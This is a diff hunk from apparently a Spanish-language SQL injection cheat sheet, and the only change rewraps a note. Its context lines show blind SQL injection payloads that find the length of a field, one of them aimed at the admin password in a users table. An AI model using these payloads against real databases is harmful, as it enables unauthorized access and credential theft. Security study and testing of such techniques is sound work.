@@ -111,7 +111,8 @@ _ENUMERAR EL TAMANO DE UN CAMPO ?
 ' AND SELECT [field_name] FROM [table_name] WHERE [field_name]='[value]' AND LENGTH(field_name)>1)='value'--
 ' AND SELECT username FROM users WHERE username='admin' AND LENGTH(password)>1)='admin'--
 
-    NOTA: Es necesario iterar el numero de posicion hasta no tener expected responses, de esa manera se obtiene la cantidad de caracteres.
+    NOTA: Es necesario iterar el numero de posicion hasta no tener expected responses, de esa manera se obtiene la 
+    cantidad de caracteres.
 
 _COMO ENUMERAR EL CONTENIDO "STRING" DE UN CAMPO ?
 
